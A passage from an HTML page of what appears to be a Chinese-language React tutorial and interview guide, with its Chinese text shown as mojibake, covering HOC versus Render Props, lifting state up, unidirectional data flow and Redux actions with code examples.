-->|æ˜¯| H[Render Props]    G -->|å¦| I[è‡ªå®šä¹‰ Hook]</pre><p><strong>åœºæ™¯åŒ–å»ºè®®</strong></p><ul><li>è·¨ç»„ä»¶å…±äº«é€»è¾‘ï¼šHOCï¼ˆå¦‚ Redux connectï¼‰</li><li>åŠ¨æ€ç»„åˆUIï¼šRender Propsï¼ˆå¦‚ Context.Consumerï¼‰</li><li>åŠŸèƒ½å¤ç”¨ï¼šè‡ªå®šä¹‰ Hooksï¼ˆå¦‚ useFormï¼‰</li><li>ç±»ç»„ä»¶æ‰©å±•ï¼šHOCï¼ˆå¦‚ withRouterï¼‰</li><li>å‡½æ•°ç»„ä»¶æ‰©å±•ï¼šè‡ªå®šä¹‰ Hooksï¼ˆå¦‚ useEffectï¼‰</li></ul><h3 id="é¢è¯•é«˜é¢‘é—®é¢˜è§£æ-2"><a href="#é¢è¯•é«˜é¢‘é—®é¢˜è§£æ-2" class="headerlink" title="é¢è¯•é«˜é¢‘é—®é¢˜è§£æ"></a>é¢è¯•é«˜é¢‘é—®é¢˜è§£æ</h3><p><strong>Qï¼šHOC å’Œ Render Props çš„ä¸»è¦åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><ul><li>HOCï¼šç»„ä»¶å·¥å‚æ¨¡å¼ï¼Œé€šè¿‡åŒ…è£…ç»„ä»¶å¢å¼ºåŠŸèƒ½ï¼Œå¯èƒ½å¼•å…¥å¤šå±‚åµŒå¥—</li><li>Render Propsï¼šå›è°ƒæ¨¡å¼ï¼Œé€šè¿‡å‡½æ•° prop å…±äº«çŠ¶æ€ï¼Œæ›´ç›´æ¥ä½†å¯èƒ½åµŒå¥—å›è°ƒ</li><li>å…³é”®åŒºåˆ«ï¼šHOC åˆ›å»ºæ–°ç»„ä»¶ï¼ŒRender Props åŠ¨æ€ç»„åˆç»„ä»¶</li></ul><p><strong>Qï¼šä½¿ç”¨ HOC æ—¶å¦‚ä½•é¿å…å‘½åå†²çªï¼Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">withEnhancedProps</span>(<span class="hljs-params">WrappedComponent</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">extends</span> <span class="hljs-title class_">React</span>.<span class="hljs-property">Component</span> &#123;<br>    <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-comment">// ä½¿ç”¨å‘½åç©ºé—´é¿å…å†²çª</span><br>      <span class="hljs-keyword">const</span> enhancedProps = &#123;<br>        <span class="hljs-attr">hoc</span>: &#123;<br>          <span class="hljs-attr">data</span>: <span class="hljs-string">&#x27;hoc data&#x27;</span>,<br>          <span class="hljs-attr">method</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;HOC method&#x27;</span>)<br>        &#125;,<br>        ...<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span><br>      &#125;;<br>      <br>      <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WrappedComponent</span> &#123;<span class="hljs-attr">...enhancedProps</span>&#125; /&gt;</span></span>;<br>    &#125;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Qï¼šRender Props ä¼šå¯¼è‡´æ€§èƒ½é—®é¢˜å—ï¼Ÿå¦‚ä½•ä¼˜åŒ–ï¼Ÿ</strong></p><p>ä¼˜åŒ–ç­–ç•¥ï¼š</p><p>(1) é¿å…å†…è”å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸æ¨èï¼šæ¯æ¬¡æ¸²æŸ“åˆ›å»ºæ–°å‡½æ•°</span><br>&lt;<span class="hljs-title class_">DataProvider</span> render=&#123;<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> /&gt;</span></span>&#125; /&gt;<br><br><span class="hljs-comment">// æ¨èï¼šä½¿ç”¨å®ä¾‹æ–¹æ³•</span><br>renderData = <span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> /&gt;</span></span>;<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">DataProvider</span> <span class="hljs-attr">render</span>=<span class="hljs-string">&#123;this.renderData&#125;</span> /&gt;</span></span><br></code></pre></td></tr></table></figure><p>(2) ä½¿ç”¨ PureComponent&#x2F;memo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">OptimizedProvider</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.PureComponent</span> &#123;<br>  <span class="hljs-comment">// ä»…å½“ props å˜åŒ–æ—¶é‡æ–°æ¸²æŸ“</span><br>&#125;<br></code></pre></td></tr></table></figure><p>(3) åˆ†ç¦»æ¸²æŸ“èŒè´£</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SplitProvider</span>(<span class="hljs-params">&#123; children &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> data = <span class="hljs-title function_">useData</span>();<br>  <span class="hljs-keyword">const</span> ui = <span class="hljs-title function_">useUI</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">DataContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;data&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">UIContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;ui&#125;</span>&gt;</span></span><br><span class="language-xml">        &#123;children&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">UIContext.Provider</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">DataContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Qï¼šä½•æ—¶åº”è¯¥é€‰æ‹©è‡ªå®šä¹‰ Hooks æ›¿ä»£ HOC æˆ– Render Propsï¼Ÿ</strong></p><ul><li>é€‰æ‹©è‡ªå®šä¹‰ Hooks å½“ï¼š<ul><li>å¤ç”¨é€»è¾‘ä¸ä¾èµ– React ç”Ÿå‘½å‘¨æœŸ</li><li>éœ€è¦åœ¨å¤šä¸ªç»„ä»¶ä¸­ä½¿ç”¨ç›¸åŒé€»è¾‘</li><li>é¡¹ç›®ä¸»è¦ä½¿ç”¨å‡½æ•°ç»„ä»¶</li><li>å¸Œæœ›å‡å°‘ç»„ä»¶åµŒå¥—å±‚çº§</li></ul></li><li>ä¿ç•™ HOC&#x2F;Render Props å½“ï¼š<ul><li>ç»´æŠ¤ç±»ç»„ä»¶ä»£ç åº“</li><li>éœ€è¦æ“ä½œç»„ä»¶å®ä¾‹ï¼ˆå¦‚ refsï¼‰</li><li>éœ€è¦è®¿é—®ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸæ–¹æ³•</li><li>éœ€è¦åŒ…è£…ç»„ä»¶ï¼ˆå¦‚æ·»åŠ é”™è¯¯è¾¹ç•Œï¼‰</li></ul></li></ul><h3 id="æ€»ç»“-3"><a href="#æ€»ç»“-3" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li>é«˜é˜¶ç»„ä»¶ (HOC)ï¼š<ul><li>æœ¬è´¨ï¼šç»„ä»¶å·¥å‚å‡½æ•°ï¼ˆè¾“å…¥ç»„ä»¶ â†’ è¾“å‡ºå¢å¼ºç»„ä»¶ï¼‰</li><li>æ¨¡å¼ï¼šå±æ€§ä»£ç†ã€åå‘ç»§æ‰¿</li><li>é€‚ç”¨ï¼šæ¨ªåˆ‡å…³æ³¨ç‚¹ã€ç±»ç»„ä»¶æ‰©å±•</li><li>æ³¨æ„ï¼šref ä¼ é€’ã€å‘½åå†²çªã€é™æ€æ–¹æ³•</li></ul></li><li>Render Propsï¼š<ul><li>æœ¬è´¨ï¼šé€šè¿‡å‡½æ•° prop å…±äº«çŠ¶æ€</li><li>æ¨¡å¼ï¼šrender prop æˆ– children as function</li><li>é€‚ç”¨ï¼šåŠ¨æ€ç»„åˆã€å¤æ‚çŠ¶æ€å…±äº«</li><li>æ³¨æ„ï¼šå›è°ƒåµŒå¥—ã€æ€§èƒ½ä¼˜åŒ–</li></ul></li><li>ç°ä»£æ¼”è¿›ï¼š<ul><li>è‡ªå®šä¹‰ Hooks æˆä¸ºå‡½æ•°ç»„ä»¶é¦–é€‰</li><li>HOC å’Œ Render Props ä»é€‚åˆç‰¹å®šåœºæ™¯</li><li>ä¸‰ç§æ¨¡å¼å¯æ··åˆä½¿ç”¨</li></ul></li><li>è®¾è®¡åŸåˆ™ï¼š<ul><li>å•ä¸€èŒè´£åŸåˆ™</li><li>å¼€é—­åŸåˆ™ï¼ˆå¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ï¼‰</li><li>ç»„åˆä¼˜äºç»§æ‰¿</li></ul></li><li>ä¼ä¸šå®è·µï¼š<ul><li>å¤æ‚çŠ¶æ€ç®¡ç†</li><li>æƒé™æ§åˆ¶</li><li>æ€§èƒ½ä¼˜åŒ–</li><li>ç±»å‹å®‰å…¨ï¼ˆTypeScriptï¼‰</li></ul></li><li>é¢è¯•é‡ç‚¹ï¼š<ul><li>HOC ä¸ Render Props åŒºåˆ«</li><li>å‘½åå†²çªè§£å†³æ–¹æ¡ˆ</li><li>æ€§èƒ½ä¼˜åŒ–ç­–ç•¥</li><li>æ¨¡å¼é€‰æ‹©å†³ç­–</li></ul></li></ul><h1 id="ç¬¬äº”ç« ï¼šReact-çŠ¶æ€ç®¡ç†"><a href="#ç¬¬äº”ç« ï¼šReact-çŠ¶æ€ç®¡ç†" class="headerlink" title="ç¬¬äº”ç« ï¼šReact çŠ¶æ€ç®¡ç†"></a>ç¬¬äº”ç« ï¼šReact çŠ¶æ€ç®¡ç†</h1><h2 id="5-1-çŠ¶æ€æå‡ä¸å•å‘æ•°æ®æµ"><a href="#5-1-çŠ¶æ€æå‡ä¸å•å‘æ•°æ®æµ" class="headerlink" title="5.1 çŠ¶æ€æå‡ä¸å•å‘æ•°æ®æµ"></a>5.1 çŠ¶æ€æå‡ä¸å•å‘æ•°æ®æµ</h2><h3 id="æ ¸å¿ƒæ¦‚å¿µå…¨æ™¯å›¾"><a href="#æ ¸å¿ƒæ¦‚å¿µå…¨æ™¯å›¾" class="headerlink" title="æ ¸å¿ƒæ¦‚å¿µå…¨æ™¯å›¾"></a>æ ¸å¿ƒæ¦‚å¿µå…¨æ™¯å›¾</h3><pre class="mermaid">graph TD  A[çŠ¶æ€ç®¡ç†æ–¹æ¡ˆ] --> B[ç»„ä»¶å†…éƒ¨çŠ¶æ€]  A --> C[çŠ¶æ€æå‡]  A --> D[å…¨å±€çŠ¶æ€ç®¡ç†]  C --> E[çˆ¶å­ç»„ä»¶é€šä¿¡]  C --> F[å…„å¼Ÿç»„ä»¶é€šä¿¡]</pre><h3 id="çŠ¶æ€æå‡ï¼ˆLifting-State-Upï¼‰æ·±åº¦è§£æ"><a href="#çŠ¶æ€æå‡ï¼ˆLifting-State-Upï¼‰æ·±åº¦è§£æ" class="headerlink" title="çŠ¶æ€æå‡ï¼ˆLifting State Upï¼‰æ·±åº¦è§£æ"></a>çŠ¶æ€æå‡ï¼ˆLifting State Upï¼‰æ·±åº¦è§£æ</h3><p><strong>åŸºæœ¬å®šä¹‰</strong><br>å°†å¤šä¸ªç»„ä»¶éœ€è¦å…±äº«çš„çŠ¶æ€æå‡åˆ°å®ƒä»¬æœ€è¿‘çš„å…¬å…±çˆ¶ç»„ä»¶ä¸­ç®¡ç†ï¼Œé€šè¿‡ props å‘ä¸‹ä¼ é€’æ•°æ®ï¼Œé€šè¿‡å›è°ƒå‡½æ•°å‘ä¸Šä¼ é€’çŠ¶æ€å˜æ›´</p><p><strong>è§£å†³ä»€ä¹ˆé—®é¢˜</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é—®é¢˜åœºæ™¯ï¼šä¸¤ä¸ªç‹¬ç«‹ç»„ä»¶éœ€è¦åŒæ­¥çŠ¶æ€</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">TemperatureInputA</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [temp, setTemp] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// ç‹¬ç«‹çŠ¶æ€</span><br>  <span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">TemperatureInputB</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [temp, setTemp] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// ç‹¬ç«‹çŠ¶æ€</span><br>  <span class="hljs-comment">// ...</span><br>&#125;<br><br><span class="hljs-comment">// æ— æ³•ä¿æŒä¸¤ä¸ªè¾“å…¥æ¡†æ¸©åº¦å€¼åŒæ­¥</span><br></code></pre></td></tr></table></figure><p><strong>è§£å†³æ–¹æ¡ˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 1. çŠ¶æ€æå‡åˆ°å…¬å…±çˆ¶ç»„ä»¶</span><br>  <span class="hljs-keyword">const</span> [temperature, setTemperature] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);<br>  <br>  <span class="hljs-comment">// 2. é€šè¿‡propsä¼ é€’çŠ¶æ€</span><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">TemperatureInput</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;temperature&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;setTemperature&#125;</span> // <span class="hljs-attr">3.</span> <span class="hljs-attr">ä¼ é€’å›è°ƒå‡½æ•°</span></span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">TemperatureDisplay</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;temperature&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// å­ç»„ä»¶æˆä¸ºå—æ§ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">TemperatureInput</span>(<span class="hljs-params">&#123; value, onChange &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;number&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;value&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;(e)</span> =&gt;</span> onChange(Number(e.target.value))&#125;</span><br><span class="language-xml">    /&gt;</span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å•å‘æ•°æ®æµï¼ˆUnidirectional-Data-Flowï¼‰"><a href="#å•å‘æ•°æ®æµï¼ˆUnidirectional-Data-Flowï¼‰" class="headerlink" title="å•å‘æ•°æ®æµï¼ˆUnidirectional Data Flowï¼‰"></a>å•å‘æ•°æ®æµï¼ˆUnidirectional Data Flowï¼‰</h3><p><strong>æ ¸å¿ƒåŸåˆ™</strong></p><pre class="mermaid">graph LR  A[State] --> B[UI]  B --> C[Actions]  C --> D[State Changes]  D --> A</pre><p><strong>React ä¸­çš„å®ç°</strong></p><pre class="mermaid">graph TD  P[çˆ¶ç»„ä»¶State] -->|Props| C1[å­ç»„ä»¶A]  P -->|Props| C2[å­ç»„ä»¶B]  C1 -->|å›è°ƒå‡½æ•°| P  C2 -->|å›è°ƒå‡½æ•°| P</pre><p><strong>ä¸åŒå‘ç»‘å®šçš„å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">å•å‘æ•°æ®æµ</th><th align="left">åŒå‘ç»‘å®š</th></tr></thead><tbody><tr><td align="left">æ•°æ®æ–¹å‘</td><td align="left">çˆ¶â†’å­</td><td align="left">çˆ¶â‡„å­</td></tr><tr><td align="left">çŠ¶æ€ç®¡ç†</td><td align="left">é›†ä¸­ç®¡ç†</td><td align="left">åˆ†æ•£ç®¡ç†</td></tr><tr><td align="left">æ•°æ®å¯é¢„æµ‹æ€§</td><td align="left">é«˜</td><td align="left">ä½</td></tr><tr><td align="left">è°ƒè¯•éš¾åº¦</td><td align="left">ç›¸å¯¹å®¹æ˜“</td><td align="left">ç›¸å¯¹å¤æ‚</td></tr><tr><td align="left">å…¸å‹æ¡†æ¶</td><td align="left">React</td><td align="left">Vue&#x2F;Angular</td></tr></tbody></table><h3 id="çŠ¶æ€æå‡çš„å±€é™æ€§"><a href="#çŠ¶æ€æå‡çš„å±€é™æ€§" class="headerlink" title="çŠ¶æ€æå‡çš„å±€é™æ€§"></a>çŠ¶æ€æå‡çš„å±€é™æ€§</h3><ul><li>ç»„ä»¶æ ‘å±‚çº§è¿‡æ·±æ—¶ï¼ˆè¶…è¿‡3å±‚ï¼‰</li><li>éç›´ç³»ç»„ä»¶éœ€è¦é€šä¿¡ï¼ˆå¦‚å ‚å…„å¼Ÿç»„ä»¶ï¼‰</li><li>è·¨è·¯ç”±ç»„ä»¶çŠ¶æ€å…±äº«</li></ul><h3 id="ç°ä»£çŠ¶æ€ç®¡ç†æ–¹æ¡ˆåŸºç¡€"><a href="#ç°ä»£çŠ¶æ€ç®¡ç†æ–¹æ¡ˆåŸºç¡€" class="headerlink" title="ç°ä»£çŠ¶æ€ç®¡ç†æ–¹æ¡ˆåŸºç¡€"></a>ç°ä»£çŠ¶æ€ç®¡ç†æ–¹æ¡ˆåŸºç¡€</h3><p><strong>Flux æ¶æ„æ€æƒ³</strong></p><pre class="mermaid">graph LR  A[Action] --> B[Dispatcher]  B --> C[Store]  C --> D[View]  D --> A</pre><p><strong>çŠ¶æ€æå‡ vs Redux</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">çŠ¶æ€æå‡</th><th align="left">Redux</th></tr></thead><tbody><tr><td align="left">çŠ¶æ€å­˜å‚¨</td><td align="left">ç»„ä»¶ state</td><td align="left">ç‹¬ç«‹ store</td></tr><tr><td align="left">çŠ¶æ€æ›´æ–°</td><td align="left">setState</td><td align="left">dispatch(action)</td></tr><tr><td align="left">æ›´æ–°é€»è¾‘</td><td align="left">åœ¨ç»„ä»¶å†…</td><td align="left">reducer çº¯å‡½æ•°</td></tr><tr><td align="left">çŠ¶æ€å…±äº«èŒƒå›´</td><td align="left">çˆ¶ç»„ä»¶åŠå­ç»„ä»¶</td><td align="left">å…¨å±€å¯è®¿é—®</td></tr><tr><td align="left">ä¸­é—´ä»¶æ”¯æŒ</td><td align="left">æ— </td><td align="left">æ”¯æŒå¼‚æ­¥æ“ä½œ</td></tr></tbody></table><h3 id="æœ€ä½³å®è·µæ€»ç»“-1"><a href="#æœ€ä½³å®è·µæ€»ç»“-1" class="headerlink" title="æœ€ä½³å®è·µæ€»ç»“"></a>æœ€ä½³å®è·µæ€»ç»“</h3><ol><li>æœ€å°çŠ¶æ€åŸåˆ™ï¼šåªæå‡å¿…è¦å…±äº«çš„çŠ¶æ€</li><li>ä¿æŒçŠ¶æ€å±€éƒ¨ï¼šéå…±äº«çŠ¶æ€ä¿æŒåœ¨ç»„ä»¶å†…éƒ¨</li><li>é¿å…è¿‡åº¦æå‡ï¼šè¶…è¿‡3å±‚ä¼ é€’è€ƒè™‘ Context</li><li>æ•°æ®ä¸å¯å˜ï¼šçŠ¶æ€æ›´æ–°æ—¶åˆ›å»ºæ–°å¯¹è±¡</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// âŒ é”™è¯¯</span><br>formData.<span class="hljs-property">items</span>.<span class="hljs-title function_">push</span>(newItem);<br><span class="hljs-title function_">setFormData</span>(formData);<br><br><span class="hljs-comment">// âœ… æ­£ç¡®</span><br><span class="hljs-title function_">setFormData</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> (&#123;<br>  ...prev,<br>  <span class="hljs-attr">items</span>: [...prev.<span class="hljs-property">items</span>, newItem]<br>&#125;));<br></code></pre></td></tr></table></figure><ol start="5"><li>å›è°ƒå‡½æ•°å‘½åï¼šç»Ÿä¸€ä½¿ç”¨ on{Event} æ ¼å¼</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;<span class="hljs-title class_">Button</span> onSave=&#123;handleSave&#125; /&gt;<br></code></pre></td></tr></table></figure><h2 id="5-2-Redux-æ ¸å¿ƒæ¦‚å¿µï¼ˆStoreã€Actionã€Reducerï¼‰"><a href="#5-2-Redux-æ ¸å¿ƒæ¦‚å¿µï¼ˆStoreã€Actionã€Reducerï¼‰" class="headerlink" title="5.2 Redux æ ¸å¿ƒæ¦‚å¿µï¼ˆStoreã€Actionã€Reducerï¼‰"></a>5.2 Redux æ ¸å¿ƒæ¦‚å¿µï¼ˆStoreã€Actionã€Reducerï¼‰</h2><h3 id="Redux-ä¸‰å¤§æ ¸å¿ƒæ¦‚å¿µå…¨æ™¯å›¾"><a href="#Redux-ä¸‰å¤§æ ¸å¿ƒæ¦‚å¿µå…¨æ™¯å›¾" class="headerlink" title="Redux ä¸‰å¤§æ ¸å¿ƒæ¦‚å¿µå…¨æ™¯å›¾"></a>Redux ä¸‰å¤§æ ¸å¿ƒæ¦‚å¿µå…¨æ™¯å›¾</h3><pre class="mermaid">graph LR  A[Action] -->|æè¿°äº‹ä»¶| B[Reducer]  B -->|å¤„ç†äº‹ä»¶| C[Store]  C -->|æä¾›çŠ¶æ€| D[View]  D -->|è§¦å‘| A</pre><h3 id="Actionï¼šçŠ¶æ€å˜åŒ–çš„æè¿°"><a href="#Actionï¼šçŠ¶æ€å˜åŒ–çš„æè¿°" class="headerlink" title="Actionï¼šçŠ¶æ€å˜åŒ–çš„æè¿°"></a>Actionï¼šçŠ¶æ€å˜åŒ–çš„æè¿°</h3><p><strong>æœ¬è´¨ä¸ç»“æ„</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŸºæœ¬ç»“æ„</span><br><span class="hljs-keyword">const</span> action = &#123;<br>  <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;ADD_TODO&#x27;</span>,      <span class="hljs-comment">// å¿…éœ€ï¼šåŠ¨ä½œç±»å‹</span><br>  <span class="hljs-attr">payload</span>: <span class="hljs-string">&#x27;Learn Redux&#x27;</span> <span class="hljs-comment">// å¯é€‰ï¼šæºå¸¦æ•°æ®</span><br>&#125;<br><br><span class="hljs-comment">// Flux Standard Action (FSA) è§„èŒƒ</span><br>&#123;<br>  <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_USER_SUCCESS&#x27;</span>,<br>  <span class="hljs-attr">payload</span>: &#123; <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;John&#x27;</span> &#125;, <span class="hljs-comment">// æˆåŠŸæ•°æ®</span><br>  <span class="hljs-attr">error</span>: <span class="hljs-literal">false</span>,                     <span class="hljs-comment">// æ˜¯å¦é”™è¯¯</span><br>  <span class="hljs-attr">meta</span>: &#123; <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() &#125;    <span class="hljs-comment">// å…ƒä¿¡æ¯</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Action åˆ›å»ºå‡½æ•°ï¼ˆAction Creatorsï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŒæ­¥ Action</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addTodo</span>(<span class="hljs-params">text</span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;ADD_TODO&#x27;</span>,<br>    <span class="hljs-attr">payload</span>: text<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// å¼‚æ­¥ Action (éœ€ä¸­é—´ä»¶æ”¯æŒ)</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUser</span>(<span class="hljs-params">id</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">async</span> dispatch =&gt; &#123;<br>    <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_USER_REQUEST&#x27;</span> &#125;);<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">getUser</span>(id);<br>      <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_USER_SUCCESS&#x27;</span>, <span class="hljs-attr">payload</span>: user &#125;);<br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>      <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_USER_FAILURE&#x27;</span>, error &#125;);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 